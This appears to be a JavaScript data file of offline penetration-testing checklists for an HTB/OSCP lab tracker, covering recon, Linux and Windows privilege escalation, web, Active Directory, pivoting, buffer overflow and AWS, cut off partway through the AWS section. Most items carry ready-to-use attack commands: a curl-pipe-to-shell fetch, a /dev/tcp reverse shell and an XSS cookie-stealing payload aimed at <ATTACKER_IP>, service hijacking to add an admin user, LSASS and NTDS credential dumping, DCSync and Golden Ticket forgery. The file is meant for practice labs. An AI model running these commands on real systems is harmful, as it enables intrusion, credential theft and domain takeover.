// ============================================================================
// Static, offline checklist "playbooks" for the Machines tracker.
// Authored from common HTB / TryHackMe / OSCP methodology. 100% local — this
// data is baked into the app and never fetched at runtime.
//
// Shape: [{ id, name, icon, desc, phases: [{ name, items: [{ label, hint }] }] }]
// `hint` is an optional command that reuses the app's <PLACEHOLDER> convention,
// so the Quick IP Changer fills it in on copy. Placeholders:
//   <TARGET_IP> <ATTACKER_IP> <LHOST> <LPORT> <PORT> <DOMAIN> <DC_IP>
//   <USER>/<USERNAME> <PASSWORD>/<PASS> <HASH> <NETWORK>/<CIDR> <TARGET_URL>
// ============================================================================
window.CHECKLIST_TEMPLATES = [
  {
    id: "general",
    name: "General / Initial Foothold",
    icon: "🎯",
    desc: "Box-agnostic recon → enumeration → foothold flow.",
    phases: [
      {
        name: "Recon",
        items: [
          { label: "Quick scan to find open ports fast", hint: "nmap -p- --min-rate 10000 -T4 -oA nmap/quick <TARGET_IP>" },
          { label: "Full TCP port scan (thorough)", hint: "nmap -p- --min-rate 5000 -oA nmap/all <TARGET_IP>" },
          { label: "Service & version + default scripts on open ports", hint: "nmap -sC -sV -p<PORT> -oA nmap/svc <TARGET_IP>" },
          { label: "Top UDP ports", hint: "sudo nmap -sU --top-ports 100 -oA nmap/udp <TARGET_IP>" },
          { label: "Add host to /etc/hosts if a domain is hinted", hint: "echo '<TARGET_IP> <DOMAIN>' | sudo tee -a /etc/hosts" }
        ]
      },
      {
        name: "Enumeration",
        items: [
          { label: "Enumerate each open service by exact version" },
          { label: "Web content discovery", hint: "feroxbuster -u http://<TARGET_IP> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt" },
          { label: "Virtual host / subdomain fuzzing", hint: "ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://<TARGET_IP> -H 'Host: FUZZ.<DOMAIN>' -fs 0" },
          { label: "SMB null / guest session", hint: "nxc smb <TARGET_IP> -u '' -p '' --shares" },
          { label: "Check default / weak credentials against every login" }
        ]
      },
      {
        name: "Foothold",
        items: [
          { label: "Search public exploits for identified versions", hint: "searchsploit <product> <version>" },
          { label: "Gain initial code execution / shell" },
          { label: "Start listener & catch reverse shell", hint: "nc -lvnp <LPORT>" },
          { label: "Stabilize the shell (PTY upgrade)", hint: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'" },
          { label: "Background & set raw mode for full TTY", hint: "stty raw -echo; fg" }
        ]
      },
      {
        name: "Loot",
        items: [
          { label: "Grab user flag", hint: "cat /home/*/user.txt 2>/dev/null || type C:\\Users\\*\\Desktop\\user.txt" },
          { label: "Situational awareness (id / whoami, network, processes)" },
          { label: "Screenshot proof of access" }
        ]
      }
    ]
  },
  {
    id: "initial-recon",
    name: "Initial Recon & Service Triage",
    icon: "🔎",
    desc: "Methodical, box-agnostic recon with a per-port triage matrix.",
    phases: [
      {
        name: "Host Discovery & Port Scan",
        items: [
          { label: "Confirm host is up", hint: "ping -c 2 <TARGET_IP>" },
          { label: "Fast full TCP sweep", hint: "nmap -p- --min-rate 10000 -T4 -oA nmap/quick <TARGET_IP>" },
          { label: "Deep scan on discovered ports", hint: "nmap -sC -sV -p<PORT> -oA nmap/svc <TARGET_IP>" },
          { label: "UDP top ports (SNMP/DNS/TFTP often here)", hint: "sudo nmap -sU --top-ports 100 -oA nmap/udp <TARGET_IP>" },
          { label: "Vuln-scan scripts on interesting ports", hint: "nmap --script vuln -p<PORT> -oA nmap/vuln <TARGET_IP>" }
        ]
      },
      {
        name: "Triage: Web (80/443/8080/8443)",
        items: [
          { label: "Fingerprint tech stack", hint: "whatweb -a3 http://<TARGET_IP>" },
          { label: "Grab TLS cert names for vhosts/emails", hint: "openssl s_client -connect <TARGET_IP>:443 </dev/null 2>/dev/null | openssl x509 -noout -text | grep -iE 'DNS:|Subject:'" },
          { label: "Directory brute force", hint: "feroxbuster -u http://<TARGET_IP> -x php,txt,html,bak -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt" },
          { label: "Vhost fuzz", hint: "ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://<TARGET_IP> -H 'Host: FUZZ.<DOMAIN>' -ac" }
        ]
      },
      {
        name: "Triage: SMB/RPC (139/445, 135)",
        items: [
          { label: "Signing, OS, and null-session summary", hint: "nxc smb <TARGET_IP> -u '' -p ''" },
          { label: "List shares", hint: "nxc smb <TARGET_IP> -u '' -p '' --shares" },
          { label: "Spider readable shares", hint: "smbclient -N -L //<TARGET_IP>/" },
          { label: "RPC user/group enum", hint: "rpcclient -U '' -N <TARGET_IP> -c 'enumdomusers'" }
        ]
      },
      {
        name: "Triage: DNS/LDAP/Kerberos (53/389/88)",
        items: [
          { label: "Attempt zone transfer", hint: "dig axfr @<TARGET_IP> <DOMAIN>" },
          { label: "Anonymous LDAP naming context", hint: "ldapsearch -x -H ldap://<TARGET_IP> -s base namingcontexts" },
          { label: "This is almost certainly a Domain Controller → switch to AD playbook" }
        ]
      },
      {
        name: "Triage: Other (21/22/25/161/3306/1433/5432/6379/2049)",
        items: [
          { label: "FTP anonymous login", hint: "ftp <TARGET_IP>" },
          { label: "SSH banner / auth methods", hint: "ssh -v <USER>@<TARGET_IP>" },
          { label: "SMTP user enumeration", hint: "smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t <TARGET_IP>" },
          { label: "SNMP community walk", hint: "snmpwalk -v2c -c public <TARGET_IP>" },
          { label: "MSSQL login", hint: "impacket-mssqlclient <USER>:<PASSWORD>@<TARGET_IP> -windows-auth" },
          { label: "Redis unauth access", hint: "redis-cli -h <TARGET_IP>" },
          { label: "NFS exports", hint: "showmount -e <TARGET_IP>" }
        ]
      },
      {
        name: "Organize & Prioritize",
        items: [
          { label: "Note versions of every service into a findings doc" },
          { label: "searchsploit each product/version", hint: "searchsploit <product> <version>" },
          { label: "Rank attack surface: web app > known CVE > default creds > brute" },
          { label: "Pick the most promising vector and commit before rabbit-holing" }
        ]
      }
    ]
  },
  {
    id: "linux-privesc",
    name: "Linux Privilege Escalation",
    icon: "🐧",
    desc: "From a low-priv Linux shell to root — every common vector.",
    phases: [
      {
        name: "Automated & Baseline Enum",
        items: [
          { label: "Run linpeas", hint: "curl -sL http://<ATTACKER_IP>/linpeas.sh | sh" },
          { label: "Current user, groups, sudo rights (biggest single win)", hint: "id; sudo -l" },
          { label: "Kernel & OS version", hint: "uname -a; cat /etc/os-release" },
          { label: "Running processes & internal listeners", hint: "ps auxww; ss -tlnp" },
          { label: "Check pspy for hidden root cron/processes", hint: "./pspy64" }
        ]
      },
      {
        name: "sudo & SUID/SGID",
        items: [
          { label: "Review every sudo entry against GTFOBins", hint: "sudo -l" },
          { label: "NOPASSWD binary abuse (e.g. sudo find)", hint: "sudo find . -exec /bin/sh \\; -quit" },
          { label: "LD_PRELOAD / env_keep sudo abuse if present" },
          { label: "CVE-2021-3156 (Baron Samedit) on old sudo", hint: "sudoedit -s '\\' $(python3 -c 'print(\"A\"*1000)')" },
          { label: "Enumerate SUID/SGID binaries", hint: "find / -perm -4000 -type f 2>/dev/null" },
          { label: "SUID GTFOBins pattern (e.g. bash -p)", hint: "/usr/bin/bash -p" }
        ]
      },
      {
        name: "Capabilities, Cron & PATH",
        items: [
          { label: "File capabilities (cap_setuid on python/perl)", hint: "getcap -r / 2>/dev/null" },
          { label: "cap_setuid python root shell", hint: "python3 -c 'import os;os.setuid(0);os.system(\"/bin/bash\")'" },
          { label: "System & user cron jobs", hint: "cat /etc/crontab; ls -la /etc/cron.*; crontab -l" },
          { label: "Writable script run by root cron → inject payload" },
          { label: "PATH hijack: root script calls relative binary", hint: "echo '/bin/bash -p' > /tmp/<binary>; chmod +x /tmp/<binary>; export PATH=/tmp:$PATH" },
          { label: "Wildcard injection (tar/rsync/chown checkpoints)" }
        ]
      },
      {
        name: "Group Memberships & Mounts",
        items: [
          { label: "docker group → root via container mount", hint: "docker run -v /:/mnt --rm -it alpine chroot /mnt sh" },
          { label: "lxd/lxc group → privileged container escape", hint: "lxc init alpine r -c security.privileged=true && lxc config device add r d disk source=/ path=/mnt && lxc start r && lxc exec r sh" },
          { label: "disk group → read raw device / debugfs", hint: "debugfs /dev/sda1" },
          { label: "Writable NFS with no_root_squash", hint: "showmount -e <TARGET_IP>" },
          { label: "NFS no_root_squash → plant SUID from attacker box", hint: "mount -o rw <TARGET_IP>:/share /mnt && cp /bin/bash /mnt/rootbash && chmod +xs /mnt/rootbash" }
        ]
      },
      {
        name: "Credential Hunting",
        items: [
          { label: "Shell history & config files", hint: "cat ~/.bash_history; grep -riE 'pass|pwd|secret|token' /home /var/www 2>/dev/null" },
          { label: "SSH private keys", hint: "find / -name 'id_*' 2>/dev/null; cat ~/.ssh/id_rsa" },
          { label: "Database / app config credentials", hint: "grep -riE 'db_pass|password' /etc /opt /srv 2>/dev/null" },
          { label: "Files owned by other users / recently modified", hint: "find / -writable -type f 2>/dev/null | grep -vE '^/proc|^/sys'" },
          { label: "Reuse creds → su / ssh to next user", hint: "su <USER>" }
        ]
      },
      {
        name: "Escalation & Confirm",
        items: [
          { label: "Exploit the chosen vector (sudo/SUID/cron/cap/group)" },
          { label: "Kernel exploit only as last resort (verify arch/version first)" },
          { label: "Confirm root & grab root.txt", hint: "id; cat /root/root.txt" }
        ]
      }
    ]
  },
  {
    id: "windows-privesc",
    name: "Windows Privilege Escalation",
    icon: "🪟",
    desc: "From a low-priv Windows shell to SYSTEM — tokens, services, creds.",
    phases: [
      {
        name: "Automated & Baseline Enum",
        items: [
          { label: "Run winPEAS", hint: "winpeasany.exe quiet" },
          { label: "Full token/privilege listing", hint: "whoami /all" },
          { label: "System info & patch level (for kernel exploits)", hint: "systeminfo" },
          { label: "Installed software & running services", hint: "wmic product get name,version" },
          { label: "PowerUp check for quick wins", hint: "powershell -ep bypass -c \"Import-Module .\\PowerUp.ps1; Invoke-AllChecks\"" }
        ]
      },
      {
        name: "Token / Privilege Abuse (Potatoes)",
        items: [
          { label: "SeImpersonate/SeAssignPrimaryToken present? → Potato", hint: "whoami /priv | findstr /i impersonate" },
          { label: "PrintSpoofer (2019/10) → SYSTEM", hint: "PrintSpoofer.exe -i -c cmd" },
          { label: "GodPotato (modern .NET, broad support)", hint: "GodPotato.exe -cmd \"cmd /c whoami\"" },
          { label: "RoguePotato / JuicyPotatoNG fallback", hint: "RoguePotato.exe -r <ATTACKER_IP> -e \"cmd.exe\" -l 9999" },
          { label: "SeBackupPrivilege → dump SAM/SYSTEM hives", hint: "reg save HKLM\\SAM sam.hive & reg save HKLM\\SYSTEM system.hive" },
          { label: "SeRestore / SeTakeOwnership → overwrite a service binary" },
          { label: "AlwaysInstallElevated (both HKLM+HKCU set)", hint: "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated" }
        ]
      },
      {
        name: "Service & File Misconfig",
        items: [
          { label: "Unquoted service paths with writable dirs", hint: "wmic service get name,pathname,startmode | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\\\"\"" },
          { label: "Weak service permissions (can reconfigure binPath)", hint: "accesschk.exe -uwcqv <USER> *" },
          { label: "Hijack a service binPath → add local admin", hint: "sc config <service> binpath= \"net user hacker Passw0rd! /add\" & sc start <service>" },
          { label: "Writable service executable → replace binary" },
          { label: "Scheduled tasks running as SYSTEM", hint: "schtasks /query /fo LIST /v | findstr /i \"TaskName Run As User\"" },
          { label: "DLL hijack: missing DLL in writable PATH dir" }
        ]
      },
      {
        name: "Credential Hunting",
        items: [
          { label: "Saved credentials in vault", hint: "cmdkey /list" },
          { label: "Runas with stored creds", hint: "runas /savecred /user:<DOMAIN>\\<USER> cmd.exe" },
          { label: "Registry autologon password", hint: "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword" },
          { label: "Unattend / sysprep / config files", hint: "dir /s /b C:\\unattend.xml C:\\sysprep.inf C:\\Windows\\Panther\\*.xml 2>nul" },
          { label: "Search files for passwords", hint: "findstr /si password *.txt *.ini *.config *.xml" },
          { label: "Dump LSASS if already admin", hint: "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit" }
        ]
      },
      {
        name: "Escalation & Confirm",
        items: [
          { label: "Execute the chosen vector → SYSTEM" },
          { label: "Kernel exploit if patch level is old (verify KBs vs systeminfo)" },
          { label: "Confirm & grab root.txt / proof.txt", hint: "whoami; type C:\\Users\\Administrator\\Desktop\\root.txt" }
        ]
      }
    ]
  },
  {
    id: "web",
    name: "Web Application",
    icon: "🌐",
    desc: "Web-facing attack surface to RCE.",
    phases: [
      {
        name: "Mapping",
        items: [
          { label: "Fingerprint tech stack", hint: "whatweb -a3 http://<TARGET_IP>" },
          { label: "Directory & file discovery", hint: "feroxbuster -u http://<TARGET_IP> -x php,txt,bak,zip -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt" },
          { label: "robots.txt / sitemap / HTML comments / JS source" },
          { label: "Spider the app & catalog every parameter (Burp)" },
          { label: "Identify auth mechanism, cookies, JWTs, CSRF tokens" }
        ]
      },
      {
        name: "Vulnerability Testing",
        items: [
          { label: "SQL injection (enumerate DBs)", hint: "sqlmap -u 'http://<TARGET_IP>/?id=1' --batch --dbs" },
          { label: "Cross-site scripting (reflected/stored/DOM)", hint: "<script>fetch('http://<ATTACKER_IP>/'+document.cookie)</script>" },
          { label: "LFI / path traversal", hint: "curl 'http://<TARGET_IP>/?page=../../../../etc/passwd'" },
          { label: "PHP wrapper LFI → RCE", hint: "curl 'http://<TARGET_IP>/?page=php://filter/convert.base64-encode/resource=index.php'" },
          { label: "Server-side template injection (SSTI)", hint: "curl 'http://<TARGET_IP>/?name={{7*7}}'" },
          { label: "OS command injection", hint: "curl 'http://<TARGET_IP>/ping?host=127.0.0.1;id'" },
          { label: "Auth bypass / IDOR / broken access control" },
          { label: "SSRF against internal services / cloud metadata" },
          { label: "Insecure file upload (webshell / bypass filters)" },
          { label: "XXE in XML endpoints" }
        ]
      },
      {
        name: "Exploitation",
        items: [
          { label: "Escalate a finding to RCE (upload / SSTI / SQLi INTO OUTFILE)" },
          { label: "SQLi write webshell", hint: "sqlmap -u 'http://<TARGET_IP>/?id=1' --os-shell" },
          { label: "Get a reverse shell", hint: "bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<LPORT> 0>&1'" }
        ]
      },
      {
        name: "Post",
        items: [
          { label: "Loot DB / config credentials", hint: "grep -riE 'pass|secret|key' /var/www 2>/dev/null" },
          { label: "Crack any recovered password hashes" },
          { label: "Pivot / reuse creds against SSH, SMB, other users" }
        ]
      }
    ]
  },
  {
    id: "ad",
    name: "Active Directory",
    icon: "🏢",
    desc: "Domain compromise: recon → creds → lateral → DA.",
    phases: [
      {
        name: "Recon",
        items: [
          { label: "Identify the Domain Controller & domain name", hint: "nxc smb <DC_IP>" },
          { label: "Enumerate users (kerbrute, no creds needed)", hint: "kerbrute userenum -d <DOMAIN> --dc <DC_IP> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt" },
          { label: "SMB / LDAP null session user list", hint: "nxc smb <DC_IP> -u '' -p '' --users" },
          { label: "Anonymous LDAP dump", hint: "ldapsearch -x -H ldap://<DC_IP> -b 'DC=<DOMAIN>,DC=local'" }
        ]
      },
      {
        name: "Initial Credentials",
        items: [
          { label: "Poison LLMNR/NBT-NS (Responder) for NetNTLM", hint: "sudo responder -I tun0" },
          { label: "AS-REP roasting (accounts w/o preauth)", hint: "impacket-GetNPUsers <DOMAIN>/ -dc-ip <DC_IP> -usersfile users.txt -no-pass" },
          { label: "Password spray a seasonal password", hint: "nxc smb <DC_IP> -u users.txt -p 'Autumn2026!' --continue-on-success" },
          { label: "Kerberoast service accounts", hint: "impacket-GetUserSPNs <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP> -request" }
        ]
      },
      {
        name: "Enumeration with Creds",
        items: [
          { label: "Run BloodHound collector", hint: "bloodhound-python -u <USER> -p <PASSWORD> -d <DOMAIN> -ns <DC_IP> -c all" },
          { label: "Map shares & readable data", hint: "nxc smb <TARGET_IP> -u <USER> -p <PASSWORD> --shares" },
          { label: "Hunt GPP cpassword in SYSVOL", hint: "nxc smb <DC_IP> -u <USER> -p <PASSWORD> -M gpp_password" },
          { label: "Review ACLs & shortest paths in BloodHound" }
        ]
      },
      {
        name: "Lateral Movement",
        items: [
          { label: "Pass-the-Hash / spray hash across hosts", hint: "nxc smb <NETWORK>/<CIDR> -u <USER> -H <HASH>" },
          { label: "Remote shell (evil-winrm)", hint: "evil-winrm -i <TARGET_IP> -u <USER> -p <PASSWORD>" },
          { label: "wmiexec / psexec fallback", hint: "impacket-wmiexec <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP>" },
          { label: "Dump local SAM/LSA creds on each owned host", hint: "nxc smb <TARGET_IP> -u <USER> -p <PASSWORD> --sam --lsa" }
        ]
      },
      {
        name: "Domain Privilege Escalation",
        items: [
          { label: "Abuse ACLs (GenericAll/WriteDACL) from BloodHound" },
          { label: "Delegation abuse (unconstrained / constrained / RBCD)" },
          { label: "DCSync if replication rights", hint: "impacket-secretsdump <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>" }
        ]
      },
      {
        name: "Domain Admin / Loot",
        items: [
          { label: "Dump NTDS.dit", hint: "impacket-secretsdump -just-dc <DOMAIN>/<USER>@<DC_IP>" },
          { label: "Confirm DA / own the DC", hint: "impacket-psexec <DOMAIN>/administrator@<DC_IP> -hashes :<HASH>" },
          { label: "Grab all flags & document the full attack path" }
        ]
      }
    ]
  },
  {
    id: "ad-detailed",
    name: "AD Kill-Chain (Detailed)",
    icon: "⛓️",
    desc: "Full domain kill-chain: no-cred → cred → BloodHound → roast → ACL → delegation → ADCS → DCSync → NTDS.",
    phases: [
      {
        name: "0 — No-Credential Foothold",
        items: [
          { label: "Enumerate users via Kerberos pre-auth", hint: "kerbrute userenum -d <DOMAIN> --dc <DC_IP> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt" },
          { label: "RID cycling over null/guest session", hint: "nxc smb <DC_IP> -u guest -p '' --rid-brute" },
          { label: "Responder for LLMNR/NBT-NS/MDNS poisoning", hint: "sudo responder -I tun0" },
          { label: "Relay NetNTLMv2 if signing disabled", hint: "impacket-ntlmrelayx -tf targets.txt -smb2support" },
          { label: "AS-REP roast the discovered users", hint: "impacket-GetNPUsers <DOMAIN>/ -dc-ip <DC_IP> -usersfile users.txt -no-pass -format hashcat" },
          { label: "Crack AS-REP (mode 18200)", hint: "hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt" }
        ]
      },
      {
        name: "1 — First Valid Credentials",
        items: [
          { label: "Validate the cred and check admin access", hint: "nxc smb <DC_IP> -u <USER> -p <PASSWORD>" },
          { label: "Password spray (avoid lockout: 1 pw / round)", hint: "nxc smb <DC_IP> -u users.txt -p 'Autumn2026!' --continue-on-success" },
          { label: "Enumerate password policy first", hint: "nxc smb <DC_IP> -u <USER> -p <PASSWORD> --pass-pol" },
          { label: "Kerberoast (crackable SPN hashes)", hint: "impacket-GetUserSPNs <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP> -request -outputfile spn.hash" },
          { label: "Crack Kerberoast (mode 13100)", hint: "hashcat -m 13100 spn.hash /usr/share/wordlists/rockyou.txt" }
        ]
      },
      {
        name: "2 — Map the Domain (BloodHound)",
        items: [
          { label: "Collect with BloodHound", hint: "bloodhound-python -u <USER> -p <PASSWORD> -d <DOMAIN> -ns <DC_IP> -c all --zip" },
          { label: "Or collect from Windows with SharpHound", hint: "SharpHound.exe -c All --zipfilename bh.zip" },
          { label: "Mark owned principals; run 'Shortest paths to Domain Admins'" },
          { label: "Note kerberoastable/AS-REP-able and DCSync-capable principals" },
          { label: "Enumerate ADCS templates with Certipy", hint: "certipy find -u <USER>@<DOMAIN> -p <PASSWORD> -dc-ip <DC_IP> -vulnerable -stdout" }
        ]
      },
      {
        name: "3 — ACL Abuse",
        items: [
          { label: "GenericAll on a user → force-change password", hint: "net rpc password <USER> 'NewP@ss123' -U <DOMAIN>/<USER>%<PASSWORD> -S <DC_IP>" },
          { label: "Targeted Kerberoast via GenericAll (add SPN)", hint: "impacket-GetUserSPNs <DOMAIN>/<USER>:<PASSWORD> -request-user <USER> -dc-ip <DC_IP>" },
          { label: "GenericWrite → set AS-REP (disable preauth) & roast" },
          { label: "WriteDACL on group → add self, then re-collect", hint: "bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p <PASSWORD> add groupMember '<GROUP>' <USER>" },
          { label: "ForceChangePassword / AddMember chains from BloodHound" }
        ]
      },
      {
        name: "4 — Delegation Abuse",
        items: [
          { label: "Unconstrained: capture TGTs via printer bug / coercion", hint: "impacket-printerbug <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP> <ATTACKER_IP>" },
          { label: "Constrained (S4U2Proxy) → impersonate admin", hint: "impacket-getST -spn cifs/<TARGET_IP> -impersonate administrator <DOMAIN>/<USER>:<PASSWORD>" },
          { label: "RBCD: write msDS-AllowedToActOnBehalfOfOtherIdentity", hint: "impacket-rbcd -delegate-from '<COMPUTER>$' -delegate-to '<TARGET>$' -action write <DOMAIN>/<USER>:<PASSWORD>" },
          { label: "Request S4U ticket then use it (KRB5CCNAME)", hint: "export KRB5CCNAME=administrator.ccache; impacket-psexec -k -no-pass <DOMAIN>/administrator@<TARGET_IP>" }
        ]
      },
      {
        name: "5 — ADCS (ESC1-8)",
        items: [
          { label: "ESC1: enrollable template w/ ENROLLEE_SUPPLIES_SUBJECT", hint: "certipy req -u <USER>@<DOMAIN> -p <PASSWORD> -dc-ip <DC_IP> -ca <CA> -template <TEMPLATE> -upn administrator@<DOMAIN>" },
          { label: "ESC2/3: Any Purpose / Enrollment Agent misuse" },
          { label: "ESC4: writable template ACL → make it ESC1", hint: "certipy template -u <USER>@<DOMAIN> -p <PASSWORD> -template <TEMPLATE> -write-default-configuration" },
          { label: "ESC6/7: EDITF_ATTRIBUTESUBJECTALTNAME2 / manage-CA" },
          { label: "ESC8: NTLM relay to CA web enrollment", hint: "impacket-ntlmrelayx -t http://<CA>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController" },
          { label: "Auth with the pfx → get NT hash", hint: "certipy auth -pfx administrator.pfx -dc-ip <DC_IP>" }
        ]
      },
      {
        name: "6 — DCSync & NTDS",
        items: [
          { label: "DCSync a single account (e.g. krbtgt)", hint: "impacket-secretsdump <DOMAIN>/<USER>:<PASSWORD>@<DC_IP> -just-dc-user krbtgt" },
          { label: "Full domain hash dump", hint: "impacket-secretsdump -just-dc <DOMAIN>/<USER>@<DC_IP>" },
          { label: "Pass-the-Hash as Administrator to own the DC", hint: "impacket-psexec <DOMAIN>/administrator@<DC_IP> -hashes :<HASH>" },
          { label: "Forge a Golden Ticket with krbtgt hash", hint: "impacket-ticketer -nthash <HASH> -domain-sid <SID> -domain <DOMAIN> administrator" },
          { label: "Dump NTDS.dit offline via VSS if needed", hint: "vssadmin create shadow /for=C:" }
        ]
      }
    ]
  },
  {
    id: "pivoting",
    name: "Pivoting & Tunneling",
    icon: "🔀",
    desc: "Reach internal networks: chisel, ligolo-ng, sshuttle, proxychains, port-forwards.",
    phases: [
      {
        name: "Discover the Internal Network",
        items: [
          { label: "Enumerate NICs & routes on the pivot host", hint: "ip a; ip route" },
          { label: "Find live internal hosts (no nmap on box? use bash)", hint: "for i in $(seq 1 254); do (ping -c1 -W1 10.10.10.$i >/dev/null && echo 10.10.10.$i up &); done" },
          { label: "Check internal listeners & ARP cache", hint: "ss -tlnp; arp -a" },
          { label: "Static-nmap upload for internal port scan if allowed" }
        ]
      },
      {
        name: "SSH Native Forwarding",
        items: [
          { label: "Local port-forward (reach internal svc locally)", hint: "ssh -L 8080:127.0.0.1:80 <USER>@<TARGET_IP>" },
          { label: "Remote port-forward (expose your box to target)", hint: "ssh -R 9001:127.0.0.1:9001 <USER>@<TARGET_IP>" },
          { label: "Dynamic SOCKS proxy over SSH", hint: "ssh -D 1080 <USER>@<TARGET_IP>" },
          { label: "sshuttle (transparent, no proxychains needed)", hint: "sshuttle -r <USER>@<TARGET_IP> 10.10.10.0/24" }
        ]
      },
      {
        name: "Chisel (SOCKS over HTTP)",
        items: [
          { label: "Start chisel server + reverse SOCKS on attacker", hint: "chisel server -p 8000 --reverse" },
          { label: "Run chisel client on target → reverse SOCKS", hint: "./chisel client <ATTACKER_IP>:8000 R:socks" },
          { label: "Chisel single remote port-forward", hint: "./chisel client <ATTACKER_IP>:8000 R:3389:127.0.0.1:3389" }
        ]
      },
      {
        name: "Ligolo-ng (TUN interface)",
        items: [
          { label: "Create tun interface on attacker", hint: "sudo ip tuntap add user $USER mode tun ligolo && sudo ip link set ligolo up" },
          { label: "Start the proxy/listener", hint: "./proxy -selfcert -laddr 0.0.0.0:11601" },
          { label: "Run agent on the pivot host", hint: "./agent -connect <ATTACKER_IP>:11601 -ignore-cert" },
          { label: "Add route to internal subnet then 'session'/'start'", hint: "sudo ip route add 10.10.10.0/24 dev ligolo" }
        ]
      },
      {
        name: "Use the Tunnel",
        items: [
          { label: "Configure proxychains SOCKS port", hint: "echo 'socks5 127.0.0.1 1080' | sudo tee -a /etc/proxychains4.conf" },
          { label: "Scan through the proxy (TCP connect only)", hint: "proxychains nmap -sT -Pn -p 445,3389,22 10.10.10.0/24" },
          { label: "Tunnel tools through the proxy", hint: "proxychains nxc smb 10.10.10.0/24 -u <USER> -p <PASSWORD>" },
          { label: "Double-pivot: chain a second agent through the first" }
        ]
      }
    ]
  },
  {
    id: "buffer-overflow",
    name: "Stack Buffer Overflow (OSCP)",
    icon: "💥",
    desc: "Classic 32-bit stack BOF: fuzz → offset → badchars → JMP ESP → shellcode.",
    phases: [
      {
        name: "Setup & Crash Confirmation",
        items: [
          { label: "Attach the target service in Immunity Debugger + mona", hint: "!mona config -set workingfolder c:\\mona\\%p" },
          { label: "Confirm you can connect to the service", hint: "nc <TARGET_IP> <PORT>" },
          { label: "Spike / send growing 'A's until it crashes (EIP overwrite)" }
        ]
      },
      {
        name: "Fuzzing",
        items: [
          { label: "Send increasing buffer lengths and watch for crash", hint: "python3 fuzz.py <TARGET_IP> <PORT>" },
          { label: "Record the length at which the service dies" }
        ]
      },
      {
        name: "Find the Offset (EIP control)",
        items: [
          { label: "Generate a cyclic pattern of the crash length", hint: "/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000" },
          { label: "Send pattern, read EIP value from the debugger" },
          { label: "Calculate the exact offset to EIP", hint: "/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q <EIP>" },
          { label: "Verify: EIP = 42424242 (BBBB), padding + 'B'*4 + 'C'*n" }
        ]
      },
      {
        name: "Bad Characters",
        items: [
          { label: "Send all bytes \\x01..\\xff after EIP (exclude \\x00)" },
          { label: "Compare ESP memory dump against the byte array", hint: "!mona bytearray -b \"\\x00\"" },
          { label: "Compare to find corrupted bytes", hint: "!mona compare -f c:\\mona\\bytearray.bin -a <ESP>" },
          { label: "Remove each bad char, regenerate, repeat until clean" }
        ]
      },
      {
        name: "Find JMP ESP",
        items: [
          { label: "Find a JMP ESP with no bad chars in a non-ASLR module", hint: "!mona jmp -r esp -cpb \"\\x00\\x0a\"" },
          { label: "Note the address (remember little-endian in exploit)" },
          { label: "Set that address as EIP; confirm it lands on ESP" }
        ]
      },
      {
        name: "Shellcode & Shell",
        items: [
          { label: "Generate shellcode excluding all bad chars", hint: "msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f py -b \"\\x00\\x0a\" EXITFUNC=thread" },
          { label: "Layout: padding + JMP_ESP(EIP) + NOP sled (\\x90*16) + shellcode" },
          { label: "Start listener", hint: "nc -lvnp <LPORT>" },
          { label: "Send the final exploit and catch SYSTEM/admin shell" }
        ]
      }
    ]
  },
  {
    id: "cloud-aws",
    name: "Cloud — AWS",
    icon: "☁️",
    desc: "Enum creds → IAM enum → S3 → EC2/SSM → privesc → persistence.",
    phases: [
      {
        name: "Obtain & Validate Credentials",
        items: [
          { label: "Loot keys from app/config/env (.aws/credentials, .env)", hint: "grep -rniE 'AKIA[0-9A-Z]{16}' . 2>/dev/null" },
          { label: "SSRF the EC2 instance metadata (IMDSv1) for role creds", hint: "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/" },
          { label: "IMDSv2 token-based fetch", hint: "TOKEN=$(curl -sX PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 60'); curl -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/" },
          { label: "Configure a profile & confirm identity", hint: "aws sts get-caller-identity --profile loot" }
        ]
      },
      {
        name: "IAM & Permission Enum",
        items: [
          { label: "Enumerate your own permissions (enumerate-iam)", hint: "python3 enumerate-iam.py --access-key <USER> --secret-key <PASSWORD>" },
          { label: "List attached user policies", hint: "aws iam list-attached-user-policies --user-name <USER> --profile loot" },
          { label: "Get inline / managed policy documents", hint: "aws iam get-user-policy --user-name <USER> --policy-name <POLICY> --profile loot" },
          { label: "Run Pacu for automated enum & privesc modules", hint: "pacu" }
        ]
      },
      {
        name: "S3 & Data Stores",
        items: [
          { label: "List buckets", hint: "aws s3 ls --profile loot" },
          { label: "Recursively list a bucket", hint: "aws s3 ls s3://<bucket> --recursive --profile loot" },
          { label: "Sync a bucket locally", hint: "aws s3 sync s3://<bucket> ./loot --profile loot" },
          { label: "Check public buckets unauthenticated", hint: "aws s3 ls s3://<bucket> --no-sign-request" },
          { label: "Dump secrets / SSM parameters", hint: "aws secretsmanager list-secrets --profile loot" }
        ]
      },
      {
